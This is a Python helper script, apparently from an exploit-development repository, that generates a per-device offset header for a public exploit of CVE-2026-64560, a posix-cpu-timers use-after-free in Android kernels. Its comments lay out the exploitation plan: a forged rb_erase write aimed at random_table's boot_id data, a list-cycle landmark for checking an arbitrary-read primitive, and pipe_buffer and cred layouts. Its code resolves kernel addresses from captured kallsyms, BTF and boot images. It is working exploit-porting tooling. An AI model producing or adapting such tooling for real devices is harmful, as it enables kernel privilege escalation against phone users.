#!/usr/bin/env python3
"""Emit a CVE-2026-64560 offset header for one device+build from a live capture.

CVE-2026-64560 is a posix-cpu-timers UAF: a non-leader execve() races
posix_cpu_timer_del(), the target's sighand goes NULL mid-exit, the delete
returns early, and an armed struct k_itimer is freed while its embedded
cpu_timer.node is still linked in the process timerqueue.

NebuSec's public exploit is keyed to android15-6.6 on Pixel 10 (blazer/frankel):
every LINK_* constant in it is a link-time address for *that* vmlinux. This
regenerates the whole table for a target we hold root on, from that device's own
kallsyms and BTF.

Usage: runner/scripts/gen-cve64560-offsets.py data/live/<codename>-<build> [-o OUT]
Inputs: <dir>/kallsyms.txt, <dir>/btf-vmlinux, <dir>/env.txt  -- required
        <dir>/Image                                           -- see below
        (all produced by runner/scripts/harvest-live.sh while the device is rooted;
        Image comes from runner/scripts/dump-boot-image.sh, which harvest-live.sh
        calls and which needs root -- harvest-live.sh:216-219)

Image is not optional for a complete header: find_bootid_entry() reads the
random_table records out of it, so without it neither DIRECT_BOOTID_PARENT nor
DIRECT_BOOTID_DATA is emitted, one UNRESOLVED line is printed for the pair, and
the run exits 1. Reproduce on the capture that has no Image:

    $ runner/scripts/gen-cve64560-offsets.py data/live/oriole-CP31.260623.005; echo $?
    UNRESOLVED (1):
      DIRECT_BOOTID_PARENT (boot_id entry not found in Image)
    1
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
from btf_offsets import Btf  # noqa: E402

# android14-6.1, VA_BITS=39. Matches the committed target.h for these devices.
KIMAGE_TEXT_BASE = 0xFFFFFFC008000000
PAGE_OFFSET = 0xFFFFFF8000000000

SYMBOLS = [
    ("LINK_INIT_TASK", "init_task"),
    ("LINK_INIT_CRED", "init_cred"),
    ("LINK_SELINUX_STATE", "selinux_state"),
    ("LINK_SELINUX_BLOB_SIZES", "selinux_blob_sizes"),
    ("LINK_KMALLOC_CACHES", "kmalloc_caches"),
    ("LINK_ANON_PIPE_BUF_OPS", "anon_pipe_buf_ops"),
    ("LINK_ASHMEM_IOCTL", "ashmem_ioctl"),
    ("LINK_ASHMEM_OPEN", "ashmem_open"),
    ("LINK_ASHMEM_RELEASE", "ashmem_release"),
    ("LINK_CONFIGFS_READ_ITER", "configfs_read_iter"),
    ("LINK_CONFIGFS_BIN_WRITE_ITER", "configfs_bin_write_iter"),
    ("LINK_MEMSTART_ADDR", "memstart_addr"),
    ("LINK_KIMAGE_VOFFSET", "kimage_voffset"),
    ("LINK_MODULE_DIRECT_BASE", "module_alloc_base"),
    ("LINK_MISC_LIST", "misc_list"),
    ("LINK_UHID_MISC", "uhid_misc"),
    ("LINK_UHID_FOPS", "uhid_fops"),
    ("LINK_SYSCTL_BOOTID", "sysctl_bootid"),
    ("LINK_RANDOM_TABLE", "random_table"),
    ("LINK_NFULNL_LOGGER", "nfulnl_logger"),
    ("LINK_SDATA", "_sdata"),
    ("LINK_END", "_edata"),
]

# Physmap aliases: writes are staged through the image's linear-map alias.
# DIRECT is empty: the physmap constants are derived below from random_table and
# the CYCLES pair.
#
# DIRECT_BOOTID_PARENT is &random_table[idx], not `random_table` itself. The
# exploit's forged rb_erase writes to parent+8, and the field it must land on is
# random_table[boot_id].data. On 6.1 the table is poolsize, entropy_avail,
# write_wakeup_threshold, urandom_min_reseed_secs, boot_id, uuid, so idx is 4;
# it is found below rather than assumed.
#
# Cross-check on panther, where every term is committed and can be re-added:
#   random_table image offset  0x02137c00   (LINK_RANDOM_TABLE - KIMAGE_TEXT_BASE)
#   + idx * sizeof(ctl_table)  4 * 0x40
#   + offsetof(ctl_table,data) 0x8
#   = 0x02137d08 == SLIDE_RANDOM_BOOT_ID_DATA_OFF (target.h:123), and
#     PAGE_OFFSET + 0x02137d08 == DIRECT_BOOTID_DATA in the generated header.
# idx and both struct terms come from BTF and the Image at run time; the 4 and
# the 0x40 above are panther's values.
DIRECT = []


def find_bootid_entry(capture, random_table_link, ctl_table_size, text_base):
    """Index of the boot_id entry in random_table, read out of the captured Image."""
    image = os.path.join(capture, "Image")
    if not os.path.exists(image):
        return None
    blob = open(image, "rb").read()

    def cstr(link):
        off = link - text_base
        if not (0 <= off < len(blob)):
            return None
        end = blob.find(b"\0", off, off + 64)
        return blob[off:end].decode("ascii", "replace") if end > 0 else None

    for idx in range(16):
        rec = random_table_link - text_base + idx * ctl_table_size
        if rec + 8 > len(blob):
            break
        procname = int.from_bytes(blob[rec:rec + 8], "little")
        if not procname:
            break
        if cstr(procname) == "boot_id":
            return idx
    return None

# Landmark pair for the exploit's confirm_stage0_cycle() gate: two list_heads
# permanently linked into a 2-element cycle, i.e.
#     *C == *(C+8) == D   and   *D == *(D+8) == C
# init_task is the swapper task -- permanently single-threaded and it never
# exits -- so its signal_struct.thread_head and task_struct.thread_node stay
# linked to each other and to nothing else for the whole boot. That makes them
# a stable readback landmark for validating the arbitrary-read bridge.
#
# The intra-struct offsets are build facts, derived from BTF. On
# panther/android14-6.1 thread_node lands at task_struct+0x6f0 (LINK_CYCLE_C
# 0xffffffc00a01fd30 - LINK_INIT_TASK 0xffffffc00a01f640 in the generated
# cves/targets/panther-CP2A.260705.006/cve64560.h). Re-derive per device from
# its own BTF.
CYCLES = [
    ("CYCLE_C", "init_task", "task_struct", "thread_node"),
    ("CYCLE_D", "init_signals", "signal_struct", "thread_head"),
]

# The UAF itself lives in these layouts.
STRUCTS = [
    ("KITIMER_SIZE", "k_itimer", None),
    ("KITIMER_LIST_OFF", "k_itimer", "list"),
    ("KITIMER_IT_LOCK_OFF", "k_itimer", "it_lock"),
    ("KITIMER_IT_CLOCK_OFF", "k_itimer", "it_clock"),
    ("KITIMER_IT_ID_OFF", "k_itimer", "it_id"),
    ("KITIMER_IT_ACTIVE_OFF", "k_itimer", "it_active"),
    ("KITIMER_IT_SIGNAL_OFF", "k_itimer", "it_signal"),
    ("KITIMER_SIGQ_OFF", "k_itimer", "sigq"),
    ("KITIMER_IT_UNION_OFF", "k_itimer", "it"),
    ("KITIMER_RCU_OFF", "k_itimer", "rcu"),
    ("CPU_TIMER_SIZE", "cpu_timer", None),
    ("CPU_TIMER_NODE_OFF", "cpu_timer", "node"),
    ("CPU_TIMER_HEAD_OFF", "cpu_timer", "head"),
    ("CPU_TIMER_PID_OFF", "cpu_timer", "pid"),
    ("CPU_TIMER_ELIST_OFF", "cpu_timer", "elist"),
    ("CPU_TIMER_FIRING_OFF", "cpu_timer", "firing"),
    ("TQ_NODE_SIZE", "timerqueue_node", None),
    ("TQ_NODE_RB_OFF", "timerqueue_node", "node"),
    ("TQ_NODE_EXPIRES_OFF", "timerqueue_node", "expires"),
    ("TQ_HEAD_SIZE", "timerqueue_head", None),
    ("TASK_SIGHAND_OFF", "task_struct", "sighand"),
    ("TASK_SIGNAL_OFF", "task_struct", "signal"),
    ("TASK_CRED_OFF", "task_struct", "cred"),
    ("TASK_TASKS_OFF", "task_struct", "tasks"),
    ("TASK_PID_OFF", "task_struct", "pid"),
    ("TASK_TGID_OFF", "task_struct", "tgid"),
    ("SIGNAL_POSIX_CPUTIMERS_OFF", "signal_struct", "posix_cputimers"),
    ("PIPE_BUFFER_SIZE", "pipe_buffer", None),
    ("PIPE_BUFFER_PAGE_OFF", "pipe_buffer", "page"),
    ("PIPE_BUFFER_OPS_OFF", "pipe_buffer", "ops"),
    ("PIPE_BUFFER_FLAGS_OFF", "pipe_buffer", "flags"),
]


def load_kallsyms(path):
    syms = {}
    with open(path, errors="replace") as fh:
        for line in fh:
            p = line.split(maxsplit=2)
            if len(p) == 3 and not p[2].strip().endswith("]"):
                syms.setdefault(p[2].strip(), int(p[0], 16))
    return syms


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("capture")
    ap.add_argument("-o", "--out")
    a = ap.parse_args()

    ks = os.path.join(a.capture, "kallsyms.txt")
    btf = os.path.join(a.capture, "btf-vmlinux")
    env = dict(
        l.strip().split("=", 1)
        for l in open(os.path.join(a.capture, "env.txt"))
        if "=" in l
    )

    syms = load_kallsyms(ks)
    text = syms.get("_text", 0)
    if not text:
        sys.exit("kallsyms has no usable _text (kptr_restrict was not lifted)")
    btf_db = Btf(btf)

    L, unresolved = [], []
    L += [
        "/* CVE-2026-64560 offsets -- GENERATED, do not edit by hand.",
        f" * device {env.get('codename')} build {env.get('build')}",
        f" * kernel {env.get('kernel')}",
        f" * SPL    {env.get('security_patch')}",
        f" * source live kallsyms + BTF, captured {env.get('harvested')}",
        f" *        _text(runtime)={text:#018x}",
        " * regenerate: runner/scripts/gen-cve64560-offsets.py " + a.capture,
        " */",
        "#pragma once",
        "",
        f"#define KIMAGE_TEXT_BASE UINT64_C({KIMAGE_TEXT_BASE:#018x})",
        f"#define LINK_IMAGE_BASE  UINT64_C({KIMAGE_TEXT_BASE:#018x})",
        f"#define PAGE_OFFSET_VA   UINT64_C({PAGE_OFFSET:#018x})",
        "",
        "/* ---- kernel symbols (link-time addresses, keyed to this build) ---- */",
    ]
    for macro, sym in SYMBOLS:
        if sym in syms:
            L.append(f"#define {macro:<32} UINT64_C({KIMAGE_TEXT_BASE + syms[sym] - text:#018x})")
        else:
            unresolved.append(f"{macro} ({sym})")

    L += ["", "/* ---- physmap aliases ---- */"]
    for macro, sym in DIRECT:
        if sym in syms:
            L.append(f"#define {macro:<32} UINT64_C({PAGE_OFFSET + syms[sym] - text:#018x})")
        else:
            unresolved.append(f"{macro} ({sym})")

    L += ["", "/* ---- forged-write parent: &random_table[boot_id] ---- */"]
    try:
        ctl_sz = btf_db.resolve("ctl_table")[1]
        data_off = btf_db.resolve("ctl_table.data")[0]
    except ValueError as exc:
        ctl_sz, data_off = None, None
        unresolved.append(f"DIRECT_BOOTID_PARENT (ctl_table: {exc})")
    if ctl_sz and "random_table" in syms:
        rt_link = KIMAGE_TEXT_BASE + syms["random_table"] - text
        idx = find_bootid_entry(a.capture, rt_link, ctl_sz, KIMAGE_TEXT_BASE)
        if idx is None:
            unresolved.append("DIRECT_BOOTID_PARENT (boot_id entry not found in Image)")
        else:
            rt_rt = syms["random_table"] + idx * ctl_sz
            L.append(f"/* random_table[{idx}] == boot_id; .data at +{data_off:#x} */")
            L.append(f"#define DIRECT_BOOTID_PARENT             UINT64_C({PAGE_OFFSET + rt_rt - text:#018x})")
            L.append(f"#define DIRECT_BOOTID_DATA               UINT64_C({PAGE_OFFSET + rt_rt + data_off - text:#018x})")
    elif "random_table" not in syms:
        unresolved.append("DIRECT_BOOTID_PARENT (random_table)")

    L += ["", "/* ---- stage0 readback landmark (2-element list cycle) ---- */"]
    for macro, sym, sname, field in CYCLES:
        try:
            off, _ = btf_db.resolve(f"{sname}.{field}")
        except ValueError as exc:
            unresolved.append(f"{macro} ({sname}.{field}: {exc})")
            continue
        if sym not in syms or off is None:
            unresolved.append(f"{macro} ({sym} / {sname}.{field})")
            continue
        runtime = syms[sym] + off
        L.append(f"#define LINK_{macro:<27} UINT64_C({KIMAGE_TEXT_BASE + runtime - text:#018x})")
        L.append(f"#define DIRECT_{macro:<25} UINT64_C({PAGE_OFFSET + runtime - text:#018x})")

    L += ["", "/* ---- struct layouts (BTF, exact for this image) ---- */"]
    for macro, sname, field in STRUCTS:
        spec = sname if field is None else f"{sname}.{field}"
        try:
            off, extra = btf_db.resolve(spec)
        except ValueError as exc:
            unresolved.append(f"{macro} ({spec}: {exc})")
            continue
        L.append(f"#define {macro:<32} {(extra if off is None else off):#06x}")

    text_out = "\n".join(L) + "\n"
    if a.out:
        os.makedirs(os.path.dirname(a.out), exist_ok=True)
        open(a.out, "w").write(text_out)
        print(f"wrote {a.out}  ({len(L)} lines)")
    else:
        print(text_out)
    if unresolved:
        print(f"\nUNRESOLVED ({len(unresolved)}):", file=sys.stderr)
        for u in unresolved:
            print("  " + u, file=sys.stderr)
        return 1
    print("all offsets resolved", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
